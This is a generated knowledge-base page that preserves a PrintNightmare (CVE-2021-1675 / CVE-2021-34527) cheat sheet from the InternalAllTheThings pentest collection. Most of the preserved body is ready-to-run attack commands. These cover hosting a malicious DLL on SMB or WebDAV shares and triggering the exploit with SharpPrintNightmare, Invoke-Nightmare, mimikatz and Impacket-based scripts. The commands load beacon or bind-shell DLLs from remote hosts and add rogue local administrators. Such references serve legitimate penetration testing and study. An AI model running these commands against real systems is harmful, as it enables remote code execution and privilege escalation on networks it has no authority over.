---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# PrintNightmare

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-cve-printnightmare` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/CVE/PrintNightmare.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [PrintNightmare](../../topics/active-directory/printnightmare.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-cve-printnightmare |
| name | PrintNightmare |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/CVE/PrintNightmare.md |

## Preserved Source Material

````yaml
_body: "# PrintNightmare\n\n> CVE-2021-1675 / CVE-2021-34527\n\nThe DLL will be stored in `C:\\Windows\\System32\\spool\\\
  drivers\\x64\\3\\`.\nThe exploit will execute the DLL either from the local filesystem or a remote share.\n\nRequirements:\n\
  \n* **Spooler Service** enabled (Mandatory)\n* Server with patches < June 2021\n* DC with `Pre Windows 2000 Compatibility`\
  \ group\n* Server with registry key `HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint\\\
  NoWarningNoElevationOnInstall` = (DWORD) 1\n* Server with registry key `HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\\
  CurrentVersion\\Policies\\System\\EnableLUA` = (DWORD) 0\n\n**Detect the vulnerability**:\n\n* Impacket - [impacket/rpcdump](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/rpcdump.py)\n\
  \n  ```ps1\n  python3 ./rpcdump.py @10.0.2.10 | egrep 'MS-RPRN|MS-PAR'\n  Protocol: [MS-RPRN]: Print System Remote Protocol\n\
  \  ```\n\n* [byt3bl33d3r/ItWasAllADream](https://github.com/byt3bl33d3r/ItWasAllADream)\n\n  ```ps1\n  cd ItWasAllADream\
  \ && poetry install && poetry shell\n  itwasalladream -u user -p Password123 -d domain 10.10.10.10/24\n  docker run -it\
  \ itwasalladream -u username -p Password123 -d domain 10.10.10.10\n  ```\n\n**Payload Hosting**:\n\n* The payload can be\
  \ hosted on Impacket SMB server since [PR #1109](https://github.com/SecureAuthCorp/impacket/pull/1109):\n\n  ```ps1\n  python3\
  \ ./smbserver.py share /tmp/smb/\n  ```\n\n* Using [3gstudent/Invoke-BuildAnonymousSMBServer](https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer/blob/main/Invoke-BuildAnonymousSMBServer.ps1)\
  \ (Admin rights required on host):\n\n  ```ps1\n  Import-Module .\\Invoke-BuildAnonymousSMBServer.ps1; Invoke-BuildAnonymousSMBServer\
  \ -Path C:\\Share -Mode Enable\n  ```\n\n* Using WebDav with [SharpWebServer](https://github.com/mgeeky/SharpWebServer)\
  \ (Doesn't require admin rights):\n\n  ```ps1\n  SharpWebServer.exe port=8888 dir=c:\\users\\public verbose=true\n  ```\n\
  \nWhen using WebDav instead of SMB, you must add `@[PORT]` to the hostname in the URI, e.g.: `\\\\172.16.1.5@8888\\Downloads\\\
  beacon.dll`\nWebDav client **must** be activated on exploited target. By default it is not activated on Windows workstations\
  \ (you have to `net start webclient`) and it's not installed on servers. Here is how to detect activated webdav:\n\n```ps1\n\
  nxc smb -u user -p password -d domain.local -M webdav [TARGET]\n```\n\n**Trigger the exploit**:\n\n* [cube0x0/SharpNightmare](https://github.com/cube0x0/CVE-2021-1675)\n\
  \n  ```powershell\n  # require a modified Impacket: https://github.com/cube0x0/impacket\n  python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10\
  \ '\\\\192.168.1.215\\smb\\addCube.dll'\n  python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\\\
  addCube.dll'\n  ## LPE\n  SharpPrintNightmare.exe C:\\addCube.dll\n  ## RCE using existing context\n  SharpPrintNightmare.exe\
  \ '\\\\192.168.1.215\\smb\\addCube.dll' 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_addb31f9bff9e936\\\
  Amd64\\UNIDRV.DLL' '\\\\192.168.1.20'\n  ## RCE using runas /netonly\n  SharpPrintNightmare.exe '\\\\192.168.1.215\\smb\\\
  addCube.dll'  'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL'\
  \ '\\\\192.168.1.10' hackit.local domain_user Pass123\n  ```\n\n* [calebstewart/Invoke-Nightmare](https://github.com/calebstewart/CVE-2021-1675)\n\
  \n  ```powershell\n  ## LPE only (PS1 + DLL)\n  Import-Module .\\cve-2021-1675.ps1\n  Invoke-Nightmare # add user `adm1n`/`P@ssw0rd`\
  \ in the local admin group by default\n  Invoke-Nightmare -DriverName \"Dementor\" -NewUser \"d3m3nt0r\" -NewPassword \"\
  AzkabanUnleashed123*\" \n  Invoke-Nightmare -DLL \"C:\\absolute\\path\\to\\your\\bindshell.dll\"\n  ```\n\n* [gentilkiwi/mimikatz\
  \ v2.2.0-20210709+](https://github.com/gentilkiwi/mimikatz/releases)\n\n  ```powershell\n  ## LPE\n  misc::printnightmare\
  \ /server:DC01 /library:C:\\Users\\user1\\Documents\\mimispool.dll\n  ## RCE\n  misc::printnightmare /server:CASTLE /library:\\\
  \\10.0.2.12\\smb\\beacon.dll /authdomain:LAB /authuser:Username /authpassword:Password01 /try:50\n  ```\n\n* [outflanknl/PrintNightmare](https://github.com/outflanknl/PrintNightmare)\n\
  \n  ```powershell\n  PrintNightmare [target ip or hostname] [UNC path to payload Dll] [optional domain] [optional username]\
  \ [optional password]\n  ```\n\n**Debug informations**\n\n| Error  | Message               | Debug                     \
  \               |\n|--------|-----------------------|------------------------------------------|\n| 0x5    | `rpc_s_access_denied`\
  \ | Permissions on the file in the SMB share |\n| 0x525  | `ERROR_NO_SUCH_USER`  | The specified account does not exist.\
  \    |\n| 0x180  | unknown error code    | Share is not SMB2                        |\n\n## References\n\n* [Playing with\
  \ PrintNightmare - 0xdf - Jul 8, 2021](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html)\n* [A Practical\
  \ Guide to PrintNightmare in 2024 - itm4n - Jan 28, 2024](https://itm4n.github.io/printnightmare-exploitation/)"
_relative_path: active-directory/CVE/PrintNightmare.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/CVE/PrintNightmare.md
````
